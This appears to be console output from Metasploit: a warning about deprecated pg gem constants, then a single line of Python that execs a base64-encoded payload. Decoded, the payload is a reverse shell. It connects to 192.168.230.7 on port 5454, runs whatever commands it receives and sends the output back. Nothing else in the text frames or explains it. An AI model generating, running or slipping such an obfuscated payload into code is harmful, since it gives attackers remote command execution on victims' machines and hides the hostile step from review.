-----------------------------------------------------------------------------------
The pg and/or activerecord gem version has changed, meaning deprecated pg constants
may no longer be in use, so try deleting this file to see if the
'The PGconn, PGresult, and PGError constants are deprecated...' message has gone:
/opt/metasploit-framework/embedded/framework/lib/pg/deprecated_constants.rb
-----------------------------------------------------------------------------------

exec('aW1wb3J0IHNvY2tldCxvcwpzbz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKc28uY29ubmVjdCgoJzE5Mi4xNjguMjMwLjcnLDU0NTQpKQp4RT1GYWxzZQp3aGlsZSBub3QgeEU6CglkYXRhPXNvLnJlY3YoMTAyNCkKCWlmIGxlbihkYXRhKT09MDoKCQl4RT1UcnVlCglzdGRpbixzdGRvdXQsc3RkZXJyLD1vcy5wb3BlbjMoZGF0YSkKCXN0ZG91dF92YWx1ZT1zdGRvdXQucmVhZCgpK3N0ZGVyci5yZWFkKCkKCXNvLnNlbmQoc3Rkb3V0X3ZhbHVlKQo='.decode('base64'))